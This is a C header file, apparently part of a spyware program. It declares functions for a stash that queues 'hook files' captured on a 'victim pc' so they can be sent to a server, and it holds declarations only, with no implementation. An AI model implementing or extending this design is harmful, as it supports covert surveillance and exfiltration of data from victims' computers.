#pragma once
#include "spy.h"

// initialize stash file which hold hook files.
// hook files in stash will be send to server in queue.
EXPORT BOOL init_stash(const char * filePath);
// push a hook file which ready for send to server to stash file.
VOID push_file(const char * filePath);
// check empty state of stash file
BOOL is_empty();
// pop a hook file from stash file, hook file will be removed after
// pop function has been called
VOID pop_file(const char * buffer);
// close stash file, this function will be called when victim pc is shutdowning
VOID close_stash();